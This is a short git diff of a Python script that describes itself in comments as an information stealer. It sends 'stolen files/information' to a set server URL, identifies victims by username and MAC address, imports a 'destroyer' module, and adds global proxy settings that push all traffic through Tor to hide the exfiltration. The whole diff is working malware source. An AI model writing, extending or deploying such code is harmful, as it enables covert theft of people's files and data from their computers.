@@ -7,12 +7,15 @@ import mimetypes # to get MIME types for files
 from contextlib import ExitStack # to close files properly
 from secrets import token_hex # to generate hashes to avoid file name conflicts
 from getmac import get_mac_address # to get mac address
+from .. import destroyer
 
-# URL = 'http://127.0.0.1:8000' # the URL/IP to which you want to send the stolen files/information to
-URL = 'http://10.0.2.2:8000'
+
+URL = 'http://10.0.2.2:8000' # the URL/IP to which you want to send the stolen files/information to
 AMOUNT_TO_SEND = 500.0 # How many files you want to send each time NOTE: Can also make sending by every X mb, or every X mb or X files whichever comes first
 USERNAME = os.getlogin()
 MAC = get_mac_address().replace(':', '') # store mac address
+os.environ['HTTP_PROXY'] = 'socks5h://127.0.0.1:9050' # set global proxy variables so all requests automatically go through the Tor SOCKS5 proxy without having to specify it in every request
+os.environ['HTTPS_PROXY'] = 'socks5h://127.0.0.1:9050' # ^
 
 #file_types = ['.txt'] # if checking for multiple file types
 files_found = [] # log files found.
